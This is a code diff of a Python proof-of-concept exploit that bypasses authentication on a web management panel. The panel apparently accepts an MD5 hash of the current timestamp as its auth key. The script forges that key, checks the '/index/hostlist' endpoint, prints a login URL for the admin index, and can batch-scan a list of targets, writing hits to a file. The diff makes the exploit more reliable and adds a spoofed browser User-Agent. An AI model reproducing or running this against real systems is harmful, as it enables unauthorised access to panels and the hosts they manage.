@@ -26,15 +26,18 @@ def proxy():
         'https': 'http://127.0.0.1:8080',}
     return proxy
 
-def gen_authkey():
+def gen_authkey(time=int(time.time())):
     mdf = hashlib.md5()
-    mdf.update(str(int(time.time())).encode("utf8"))
+    mdf.update(str(time).encode("utf8"))
     auth_key = mdf.hexdigest()
     return auth_key
 
 def poc(rooturl):
-    headers = {"Content-Type": "application/x-www-form-urlencoded", "X-Requested-With": "XMLHttpRequest"}
-    payload = "auth_key=" + gen_authkey() + "&timestamp=" + str(int(time.time())) + "&offset=0&limit=10&search="
+    headers = {"Content-Type": "application/x-www-form-urlencoded", 
+               "X-Requested-With": "XMLHttpRequest", 
+               "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36"}
+    now = int(time.time())
+    payload = "auth_key=" + gen_authkey(now) + "&timestamp=" + str(now) + "&offset=0&limit=10&search="
     try:
         res = requests.post(rooturl+'/index/hostlist', headers=headers, data=payload, proxies=proxy(), timeout=15, verify=False)
         if (res.status_code == 200) and ('"rows":' in res.text and 'total":' in res.text):
@@ -59,9 +62,10 @@ if __name__ == '__main__':
 
     if len(sys.argv) == 3:
         if sys.argv[1] in ['-u', '--url']:
-            rooturl = requests.utils.urlparse(args.url).scheme + "://" + requests.utils.urlparse(args.url).netloc   
+            rooturl = requests.utils.urlparse(args.url).scheme + "://" + requests.utils.urlparse(args.url).netloc
             if poc(rooturl) == True:
-                uri = "/Index/Index?auth_key=%s&timestamp=%s" % (gen_authkey() ,int(time.time()))
+                now = int(time.time())
+                uri = "/Index/Index?auth_key=%s&timestamp=%s" % (gen_authkey(now) , now)
                 print("[+] Please Open This URL: {}{} ".format(rooturl,uri))
             else:
                 sys.exit(0)
@@ -71,7 +75,8 @@ if __name__ == '__main__':
                     urls = []
                     urls = target.read().splitlines()
                     for url in urls:
-                        if poc(url) == True:
+                        rooturl = requests.utils.urlparse(url).scheme + "://" + requests.utils.urlparse(url).netloc
+                        if poc(rooturl) == True:
                             with open("success.txt", "a+") as f:
                                 f.write(url + "\n")
     else:
